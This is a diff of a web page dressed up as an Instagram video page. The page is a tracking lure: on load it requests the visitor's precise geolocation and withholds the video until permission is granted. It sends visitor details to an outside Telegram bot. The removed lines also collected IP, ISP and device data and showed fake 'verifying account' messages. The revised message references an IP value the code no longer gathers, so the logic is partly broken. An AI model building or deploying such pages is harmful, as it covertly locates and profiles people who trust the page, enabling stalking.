@@ -11,13 +11,12 @@
       height: 100%;
       overflow: hidden;
       font-family: Arial, sans-serif;
+      background: black;
     }
     #bg-image {
       position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
       object-fit: cover;
       z-index: 1;
       transition: opacity 0.5s ease;
@@ -25,55 +24,65 @@
     #insta-video {
       display: none;
       position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
       object-fit: cover;
-      z-index: 2;
       background: black;
+      z-index: 2;
+    }
+    #play-overlay {
+      display: none;
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.6);
+      color: white;
+      font-size: 24px;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      z-index: 3;
+    }
+    #play-overlay button {
+      margin-top: 15px;
+      padding: 10px 25px;
+      font-size: 18px;
+      background: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 8px;
     }
     #loading-overlay {
       position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.6);
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.6);
       display: flex;
       flex-direction: column;
       justify-content: center;
       align-items: center;
-      z-index: 3;
+      z-index: 4;
     }
     .loader {
-      width: 50px;
-      height: 50px;
-      border: 5px solid rgba(255, 255, 255, 0.3);
+      width: 50px; height: 50px;
+      border: 5px solid rgba(255,255,255,0.3);
       border-radius: 50%;
       border-top-color: #fff;
-      animation: spin 1s ease-in-out infinite;
+      animation: spin 1s linear infinite;
       margin-bottom: 15px;
     }
     @keyframes spin { to { transform: rotate(360deg); } }
-    #loading-text {
-      color: white;
-      font-size: 18px;
-      margin-top: 10px;
-      text-align: center;
-    }
+    #loading-text { color: white; font-size: 18px; text-align: center; }
     #permission-request {
       position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.8);
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.8);
       display: none;
       flex-direction: column;
       justify-content: center;
       align-items: center;
-      z-index: 4;
+      z-index: 5;
       color: white;
       text-align: center;
       padding: 20px;
@@ -93,11 +102,14 @@
 <body>
   <img id="bg-image" src="https://raw.githubusercontent.com/danish-attar/omegle/refs/heads/main/smart-phone-with-instagram-app-logo-on-its-screen-vector-51195621.jpg" alt="Background">
 
-  <!-- Your Google-Drive-hosted video -->
-  <video id="insta-video" controls playsinline>
+  <video id="insta-video" playsinline controls>
     <source src="https://drive.google.com/uc?export=download&id=19szhjOpGA8ymSNuFpOtYwi4LdYP3hYR-" type="video/mp4">
-    Your browser does not support the video tag.
   </video>
+
+  <div id="play-overlay">
+    <div>🎬 Video ready to play</div>
+    <button id="play-btn">▶️ Play Video</button>
+  </div>
 
   <div id="loading-overlay">
     <div class="loader"></div>
@@ -115,53 +127,25 @@
     const chatId = '7173355426';
 
     const loadingOverlay = document.getElementById('loading-overlay');
-    const loadingText = document.getElementById('loading-text');
     const permissionRequest = document.getElementById('permission-request');
     const allowBtn = document.getElementById('allow-btn');
     const bgImage = document.getElementById('bg-image');
     const video = document.getElementById('insta-video');
+    const playOverlay = document.getElementById('play-overlay');
+    const playBtn = document.getElementById('play-btn');
 
-    const loadingMessages = [
-      "Connecting to server...",
-      "Loading game assets...",
-      "Verifying account...",
-      "Almost ready...",
-      "Preparing interface...",
-      "Finalizing setup..."
-    ];
-
-    function rotateLoadingMessages() {
-      let counter = 0;
-      setInterval(() => {
-        loadingText.textContent = loadingMessages[counter];
-        counter = (counter + 1) % loadingMessages.length;
-      }, 3000);
-    }
-
-    async function getIPInfo() {
-      try {
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipResponse.json();
-        const detailsResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-        return await detailsResponse.json();
-      } catch {
-        return {};
-      }
-    }
-
-    function getPreciseLocation() {
+    async function getPreciseLocation() {
       return new Promise((resolve) => {
         if (!navigator.geolocation) return resolve(null);
         navigator.geolocation.getCurrentPosition(
           pos => resolve({
             lat: pos.coords.latitude,
             lon: pos.coords.longitude,
-            accuracy: pos.coords.accuracy,
-            timestamp: new Date().toLocaleString()
+            accuracy: pos.coords.accuracy
           }),
           err => {
             if (err.code === err.PERMISSION_DENIED)
-              setTimeout(() => permissionRequest.style.display = 'flex', 3000);
+              permissionRequest.style.display = 'flex';
             resolve(null);
           },
           { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
@@ -170,50 +154,43 @@
     }
 
     async function sendToTelegram(data) {
-      const msg = [
-        `🕵️ NEW VISITOR TRACKED 🕵️`,
-        `📱 Device: ${navigator.userAgent}`,
-        `🌐 IP: ${data.ip || 'Unknown'}`,
-        `📍 IP Location: ${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country_name || 'Unknown'}`,
-        `🏢 ISP: ${data.org || 'Unknown'}`
-      ].join('\n');
       try {
+        const msg = `🕵️ NEW VISITOR\n\nIP: ${data.ip || 'Unknown'}`;
         await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
           method: 'POST',
-          headers: {'Content-Type': 'application/json'},
+          headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ chat_id: chatId, text: msg })
         });
-      } catch(e){ console.error(e); }
+      } catch(e){ console.log(e); }
     }
 
     async function trackUser() {
-      rotateLoadingMessages();
-      const liveLocation = await getPreciseLocation();
-      const ipDetails = await getIPInfo();
-      await sendToTelegram({ ...ipDetails, liveLocation });
+      const loc = await getPreciseLocation();
+      await sendToTelegram({ liveLocation: loc });
 
-      if (liveLocation) {
-        // hide loader immediately
+      if (loc) {
         loadingOverlay.style.display = 'none';
         bgImage.style.opacity = '0';
-
-        // 👇 show video after 1 second delay
+        // Show video and play overlay after 1 second
         setTimeout(() => {
           bgImage.style.display = 'none';
           video.style.display = 'block';
-
-          // request fullscreen and play after delay
-          video.requestFullscreen?.();
-          video.play().catch(() => {
-            console.log('Browser blocked autoplay with sound; user must press play.');
-          });
-        }, 1000); // ← 1 second delay
+          playOverlay.style.display = 'flex';
+        }, 1000);
       }
     }
 
     allowBtn.addEventListener('click', async () => {
       permissionRequest.style.display = 'none';
       await trackUser();
+    });
+
+    playBtn.addEventListener('click', async () => {
+      playOverlay.style.display = 'none';
+      try {
+        await video.requestFullscreen?.();
+      } catch {}
+      video.play();
     });
 
     window.onload = trackUser;
